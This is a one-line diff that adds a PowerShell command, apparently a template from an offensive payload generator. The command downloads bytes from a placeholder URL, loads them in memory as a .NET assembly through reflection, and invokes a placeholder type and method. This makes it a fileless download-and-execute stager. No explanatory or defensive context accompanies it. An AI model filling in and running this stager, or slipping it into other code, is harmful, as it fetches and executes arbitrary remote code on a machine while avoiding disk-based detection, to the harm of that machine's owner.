@@ -1,0 +1,1 @@
+$data = (new-object system.net.webclient).DownloadData("[[[[downloadFrom]]]]");$assem = [system.reflection.assembly]::Load($data);$class = $assem.gettype("[[[[assemblyName]]]]");$method = $class.GetMethod("[[[[methodName]]]]");$method.invoke(0,$null);
